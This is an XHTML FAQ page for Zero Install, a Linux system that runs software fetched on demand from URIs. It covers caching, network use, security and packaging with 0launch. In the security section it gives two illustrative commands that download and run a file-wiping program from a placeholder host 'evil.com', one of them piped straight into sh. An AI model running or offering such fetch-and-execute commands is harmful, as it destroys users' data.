<?xml version='1.0' encoding='utf-8'?>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">

<h2>FAQ</h2>

<toc level='dt' super-level='h2'/>

<div class='answers'>
<h2>General questions</h2>

<dl>

<dt>What is it?</dt>
<dd>

<p>
Zero Install is a way to run software without an explicit installation step.
This is easier (<i>install and run</i> becomes just <i>run</i>) and safer
(installation doesn't happen as root).
</p>

</dd>
<dt>I haven't tried it yet, but it sounds really complicated</dt>
<dd>
<p>It isn't. <a href='injector.html'>Try it</a>. Now.</p>

</dd>
<dt>What are "decentralised" installation systems, and why are they important?</dt>
<dd>
<p>
See my <a href='http://osnews.com/story.php/16956/Decentralised-Installation-Systems'>essay on OSNews</a> or,
if you're in a hurry, just read <a href='http://osnews.com/story.php/16956/Decentralised-Installation-Systems/page7/'>the summary</a>.
</p>

</dd>
<dt>Doesn't Zero Install require a kernel module?</dt>
<dd>
<p>
Not any more. That was <a href='fs-faq.html'>the old version</a>.
</p>

</dd>
<dt>Isn't is really hard to run applications if you always have to
type URIs for them?</dt>
<dd>

<p>Yes. As with the web, that works but it's not the intended way to
do it. Like the web, you have links to the URIs, and you use the links
normally.</p>
<p>
For example, you can run <b>0alias</b> to let you run programs quickly
from the shell, or
<a href="http://rox.sourceforge.net/phpwiki/index.php/AddApp">AddApp</a>
to create graphical launchers, for example.
</p>

<p>
You could put a launcher on the desktop background, set a keyboard shortcut, or
add it to your Start menu. A 'distribution' could be nothing more than a web
page listing links to high quality software for a particular audience.
</p>

</dd>
<dt>How do you do integration (eg, making a Start menu show all
installed software)?</dt>
<dd>

<p>Since there is no concept of software being 'installed' or
'not-installed', this is not required. The menu (or other launching
device) simply shows applications that the user may want to run. They
will be fetched on demand.</p>

<p>For example, the set of applications your system shows you on first
install is the applications the distribution author thinks you might
like. They may be already in the cache, or they may be loaded on
demand (depending on the distribution's installer).
</p>

<p>Indeed, the question is backwards. The menu doesn't show installed
software; rather, the 'installed' software is what the user has put on
the menu.
</p>

<p><i>However</i>, there's nothing to stop you implementing a more
'traditional' installation system on top of Zero Install. 
<a href='http://rox.sourceforge.net/desktop/node/402'>Zero2Desktop</a>
adds a launcher to the GNOME or KDE Applications menu, by creating a
freedesktop.org ".desktop" file for it. The new menu entry is independent of
the program data though; removing the program from the cache doesn't remove the
menu item (clicking on it would simply offer to download the program
again).</p>

</dd>
<dt>Isn't it wasteful for every program to bundle all its dependencies?</dt>
<dd>
<p>
Yes, but Zero Install doesn't do that. Everything is dynamically linked, just as in
a traditional Linux system: you can publish a program on your web-site that links against
a library on another web-site. When updates are available for a library, they are used
by all programs using that library (except for programs which are incompatible
with the new library version, which will continue using the older version,
without preventing other programs from upgrading).
</p>

</dd>
<dt>Why is it called the "injector"?</dt>
<dd>

<p>
The name comes from <i>Dependency Injection</i> - see <a href='http://roscidus.com/desktop/node/903'>"The scarily-named Injector"</a>
for details.
</p>

</dd>
<dt>Wouldn't it be cool if you could install software just by clicking in a web page?</dt>
<dd>
<p>
It's a bit of a security risk. If you set up your browser to do this, then the
author of any random web-site can try to trick you into clicking on some
harmless-looking link. They may even be able to trigger the process without any
action from you at all. Zero Install's confirmation dialogs should prevent it
from actually getting installed, but:
</p>

<ul class='spaced'>
 <li>Even with confirmation boxes, web pages can still annoy users by opening thousands of
 them. You'd need some kind of popup-blocker type technology to stop that.</li>
 <li>The malicious web page gets to send arbitrary data of their choice to Zero Install.
 For example, they might try to exploit a buffer-overflow in GnuPG by sending malformed
 data. Zero Install <i>should</i> reject it, but it's safer if we don't even
 allow the process to start.</li>
 <li>If you do this, then your browser needs permission to run arbitrary programs,
add items to your Start menu, etc. Given that the browser is one of the most at-risk
components on your system, this doesn't sound like a good plan (although browsers are
often configured this way at present).</li>
</ul>

<p>
Therefore, we require you to drag the link to the installer to start the
process. That way, if you weren't intending to install anything, then the
process doesn't even start. As an added bonus, this lets you specify where
on your desktop you want the launcher created.
</p>

</dd>
<dt>Will Zero Install conflict with my existing package manager?</dt>
<dd>

<p>
No. Zero Install only writes to its own cache directory. It is completely
independent of your existing packaging system. If you install the same program
using both systems, you'll get two copies on your system, but they will be kept
separate. You can use this to test a newer version of a program without messing
up your existing installation.
</p>

<p>
Zero Install can use distribution packages to satisfy some
dependencies (rather than downloading a new copy itself). This doesn't affect
programs installed using the native packaging system at all.
See <a href='distribution-integration.html'>Distribution Integration</a> for
details.
</p>

<p>
Note: while installation won't cause problems, actually running a program might
change something (for example, a newer version may automatically upgrade a
configuration file to a format that the older version can't read). This is
essentially the same situation as when you downgrade a package to a previous
version using your normal package manager.
</p>

</dd>
<dt>How do I know you won't start charging for this service?</dt>
<dd>

<p>
I'm not providing a service. You distribute software by hosting some files on
your own web server. The only centralised URL is the default place it checks for
updates to the GUI, and you can change that easily enough (or just disable updating).
The core software is all LGPL or GPL. Of course, you're welcome to
<a href='http://sourceforge.net/developer/user_donations.php?user_id=40461'>send me
money</a> if you want ;-)
</p>

</dd>
<dt>What if something gets automatically removed from the cache while
I'm up a mountain with my laptop?</dt>
<dd>

<p>Currently, nothing is ever automatically removed from the cache.
Users can choose the purging scheme that suits them. For users with
broadband, that might mean removing anything that hasn't been accessed
for a year. For users with dial-up and 80Gb disks, that probably means
never ever removing anything.
</p>

<p>
You can click on the <b>Cache</b> button to view the cache and remove
versions of programs you don't need anymore:
</p>

<p style='text-align: center'>
  <img width="812" height="334" src="injector-cache.png"
  	alt='Uninstalling programs with the injector'/>
</p>

<p>
You can also just delete things from the <b>~/.cache/0install.net</b>
directory directly, but it's easier using the GUI.
</p>

</dd>
<dt>What happens if there are two programs which may not be run simultaneously
for some reason?</dt>
<dd>
<p>
Running and installing are separate. In Debian, for example, installing some
software (eg, exim) may also cause it to run, but in zero install there is no
install step, only the running step. So, you can 'install' any number of
conflicting packages, but you can still only run one mail system at once.
</p>

</dd>
<dt>Can upstream authors really be trusted to provide decent quality software?</dt>
<dd>

<p>
Traditionally, a lot of the QA work that goes on in open source software is done
by distributions (such as Debian). They take the `upstream' code from the software
authors, and then provide a packaged version to their users. There are then two classes
of bugs to worry about: upstream bugs and packaging bugs. Since it's not usually clear
to users which bugs are in which category, they tend to report all bugs to the packagers,
who often then fix even upstream bugs in their own packages.
</p>

<p>
The effect of this is that distribution-provided packages are often more reliable than
upstream ones (since upstream don't get to hear about many of the bugs), and different
distributions have fixed different bugs, with no coordination between them. With Zero
Install, bugs get fixed upstream. So, the 'Debian developer' who currently fixes Gimp
bugs would still do the same job, but as a 'Gimp developer' instead. Thus, the fixes
would benefit everyone, not just Debian users.
</p>

<p>
Of course, the other reason why packages may be different to the upstream versions is
because upstream is slow to respond, uninterested, or known to be careless about quality.
In this case, a Zero Install packager can provide a fixed version from their own site
and get other people to link to that. The advantage here is that, again, everyone benefits.
</p>

</dd>
<dt>Does this replace /etc, /var, /tmp, etc?</dt>
<dd>

<p>
No. Zero Install is read-only, so you couldn't store configuration, data or temporary
files in it, even if you wanted to. It replaces <b>/usr</b> and <b>/opt</b>.
It's sensible to keep the other things separate, because they need to be treated
differently:
</p>

<dl>
<dt>/etc</dt>
<dd>Contains system configuration. Should be backed up, and probably kept under version
control too. May be mounted read-only most of the time.</dd>

<dt>/home</dt>
<dd>User data. Must be writable, and often changes. Should be backed up regularly.</dd>

<dt>/var</dt>
<dd>Changes quickly (contains print and mail queues, logs, etc). Must be writable. Doesn't
need to be backed up, but data should persist over reboots. Zero Install cache is stored
here; if lost it will just prompt you to download the programs again when you run them.</dd>

<dt>/tmp</dt>
<dd>Changes quickly and must be writable, but need not persist over reboots (can use
tmpfs rather than a physical disk).</dd>
</dl>

</dd>
<dt>What was the inspiration for Zero Install?</dt>
<dd>

<p>
Several things. <a href="http://www.coda.cs.cmu.edu/">CODA</a> and
<a href="http://www.gedanken.demon.co.uk/wwwoffle/">wwwoffle</a>
for showing that caching network filesystems can still work when
off-line. <a href="http://w3.org">The W3C</a> for using URIs for namespaces.
Not <a href="http://java.sun.com/products/javawebstart/">Java Web Start</a>,
Konvalo or <a href="http://cr.yp.to/slashpackage.html">D. J. Bernstein's
slashpackage</a> though, because I had never heard of them when I started the
project.</p>

</dd>
</dl>

</div>

<div class='answers'>
<h2>Network questions</h2>

<dl>

<dt>Isn't fetching stuff over the web really slow?</dt>
<dd>

<p>You have to get stuff over the web anyway the first time. The
system caches everything, and you can run the software in future
without needing a network connection.
</p>

</dd>
<dt>Doesn't it require a fast Internet connection?</dt>
<dd>

<p>
No more than downloading programs from the Internet normally. However, it can
still save you some time, since it might only download the documentation for
a package when you click on Help, for example. With traditional systems, all the
extras have to get installed with the main program because users can't install
anything themselves later if they find they need it.
</p>

<p>
When you consider that users always need the <i>ability</i> to read a program's
documentation, use a particular export filter, etc, but rarely do so for any given
version of any particular program, you can see that the savings can be quite large.
</p>

</dd>
<dt>What about people without Internet connections?</dt>
<dd>

<p>
You can use <a href='0export.html'>0export</a> to create a setup.sh self-extracting
installation script for distribution on CDs.
</p>

</dd>
<dt>What about when resources move?</dt>
<dd>
<p>Everything you've already accessed at least once will continue to
work. Users trying software for the first time will find that it
doesn't work due to broken links. This is not new, either. The download
instructions for ROX-Filer tell users that they need to get GTK from
www.gtk.org and libxml from www.xmlsoft.org. If those sites change
their names, the download instructions will be broken. It really
doesn't make any difference.
As with the regular web, people can leave redirections to the new
site.</p>

<p>
Also, if a feed can't be fetched from its main site, Zero Install will
automatically try using a <a href='0mirror.html'>mirror service.</a>
Mirror services continue hosting feeds that are no longer available from their
original sites.
</p>

<p>
The <b>0launch --import</b> command lets you import the interface from the
new location, and <b>0store</b> allows adding any archive to the cache (provided
its message digest matches).
</p>

</dd>
</dl>

</div>

<div class='answers'>
<h2>Security questions</h2>

<dl>

<dt>How secure is this?</dt>
<dd>
<p>About as secure as any system which ultimately involves running
software written by people you don't know who live in far away
countries. However, since the downloading is automatic, there are more
chances for automatic checking (eg, verifying GPG signatures, etc):
</p>

<p style='text-align: center'>
<img width="432" height="382" src="screens/trust-domain.png"
     alt='You are asked to confirm each new key'/>
</p>

<p>
To be more precise, it has all the advantages of application
directories (no install step, so no chance for anything to run as
root). In addition, if two users try to run the same application, they
both automatically get the same cached copy, whereas without this each
would have to install a separate copy to their home directory, or one
user has to trust the other user not to have modified his copy, and
use that.
</p>
<p>
See the <a href='injector-security.html'>injector security issues</a> document
for more information.
</p>

</dd>
<dt>Doesn't Zero Install make it easier to send users malicious software?</dt>
<dd>

<p>
Not really. True, you could email a user, telling them to run:
</p>
<pre>
$ 0launch http://evil.com/wipe-my-files
</pre>

<p>
But on the other hand, you could also send them an email telling them to type:
</p>
<pre>
$ lynx -source http://evil.com/wipe-my-files | sh -
</pre>

<p>
Both can do exactly the same amount of damage, but the second works on any
system. If a user is prepared to run unknown software, they're going to do it
with or without Zero Install.
</p>

<p>
Zero Install helps with large, complicated programs with lots of
dependencies, whereas your typical malicious program is only a few lines long,
and doesn't benefit from it.
</p>
</dd>

<dt>But what about kernel bugs? Zero Install is still vulnerable then!</dt>
<dd>

<p>
Recently, a bug was found (and fixed) in the Linux kernel that allowed any user
to become root. Most famously, it was used to compromise some of Debian's
servers. Couldn't a user access some software through Zero Install that
took advantage of this bug to break an un-patched machine?
</p>

<p>
Well, yes. But, as with the question above, they could do it just as easily
without Zero Install (using wget, or just by typing the program in themselves).
If your kernel is insecure, you have a problem with or without Zero Install.
</p>


</dd>
</dl>
</div>

<div class='answers'>
<h2>Developers</h2>

<dl>

<dt>How do I provide software using Zero Install?</dt>
<dd>

<p>
The main requirement is that the program doesn't use hard-coded paths. It should
get resources from its own package relative to its own location (e.g. a shell script
would use <b>`dirname $0`/mydata</b> rather than <b>/usr/share/myprog/mydata</b>). Resources
in other packages should be found using environment variables (<b>$GAME_DATA/level1</b> rather
than <b>/usr/share/gamedata/level1</b>). Many programs do this already.
</p>

<p>
Once you have suitable binary, upload an archive of it onto your web-site in the normal
manner. The most widely understood format is <b>.tar.gz</b>, but Zero Install can also extract
from <b>.tar.bz2</b> archives, <b>.zip</b> files, and <b>.rpm</b>, <b>.deb</b> and <b>.autopackage</b> packages if the
appropriate extraction program is available (<b>unzip</b>, <b>rpm2cpio</b>, etc). Often, you
don't need to do anything special for Zero Install and can just use your existing binary release.
</p>

<p>Finally, you need to write a short XML file describing your program, the versions of it that
are available, how to get them, and what libraries they require.
</p>

<p>See the <i> <a href='injector-packagers.html'>Injector Packaging Guide</a></i>
for details.</p>

</dd>

<dt>How can I run my own version of something, instead of downloading a released version?</dt>
<dd>

<p>
Let's say you want to run a subversion (developer) version of Edit. Start by checking out the latest
version from SVN, as normal:
</p>

<pre>
$ svn co https://svn.sourceforge.net/svnroot/rox/trunk/Edit 
</pre>

<div class='note'>
<p>
Aside: If you don't have a subversion client, just use Zero Install to get one:
</p>

<pre>
$ 0alias svn http://0install.net/2007/3rd-party/Subversion.xml
</pre>
</div>

<p>
Now, if you try to run it directly, it will probably complain that it can't find ROX-Lib (a library
it needs). The required libraries are listed in the <b>Edit.xml</b> file, and you can run that
using <b>0launch</b>:
</p>

<pre>
$ cd Edit
$ ./AppRun
*** This program needs ROX-Lib2 (version 1.19.14) to run.
$ 0launch Edit.xml
[ edit runs ]
</pre>

<p>
Of course, you could do <b>0alias edit-svn Edit.xml</b> to make a command that runs this version
easily.
</p>
</dd>

<dt>How can I register my own version under the original's URI?</dt>
<dd>

<p>
The answer to the last question showed how to run a local version of a program directly, using 0launch
to fetch the libraries it needed. However, if you (or some other program) run Edit using the normal
URI (<b>http://rox.sourceforge.net/2005/interfaces/Edit</b>), your version won't show up. To add it,
use <b>--feed</b>:
</p>

<pre>
$ <b>cd Edit</b>
$ <b>0launch --feed Edit.xml</b>
Feed 'Edit.xml':

1) Add as feed for 'http://rox.sourceforge.net/2005/interfaces/Edit'

Enter a number, or CTRL-C to cancel [1]: 

Feed list for interface 'Edit' is now:
- /home/talex/Projects/Edit/Edit.xml

$ <b>0launch -g http://rox.sourceforge.net/2005/interfaces/Edit</b>
</pre>

<p>
When the GUI opens, you should see your local feed listed:
</p>

<p style='text-align: center'>
<img width="559" height="315" src="edit-cvs.png"
     alt='The injector GUI showing the local feed for Edit' />
</p>

<p>
The new version will appear in the list of available versions, and will be selected if it's
the newest one (which a fresh subversion checkout should be - the version normally ends in
<b>-post</b> to indicate that it is not a released version):
</p>

<p style='text-align: center'>
<img width="472" height="277" src="screens/edit-local.png"
     alt='The injector GUI showing Edit 2.0-post version selected' />
</p>

<p>
This is particularly useful for libraries, since they are always used by other programs rather
than run directly.
</p>

</dd>
<dt>Is Linux binary compatibility good enough to share binaries between
distributions?</dt>
<dd>

<p>
There are some problems in this area generally (not just with Zero Install).
The <a href="http://www.autopackage.org">Autopackage</a> project is working
on these issues; see their FAQ for a detailed look at the problems faced.
However, we have binaries for ROX-Filer and many other programs that work on
all distributions, so it's certainly possible. Zero Install can help you create
more compatible binaries by compiling against older versions of header files; see
<a href='http://rox.sourceforge.net/desktop/node/289'>Easy GTK binary compatibility</a>
for an example.
</p>

</dd>
</dl>
</div>

</html>
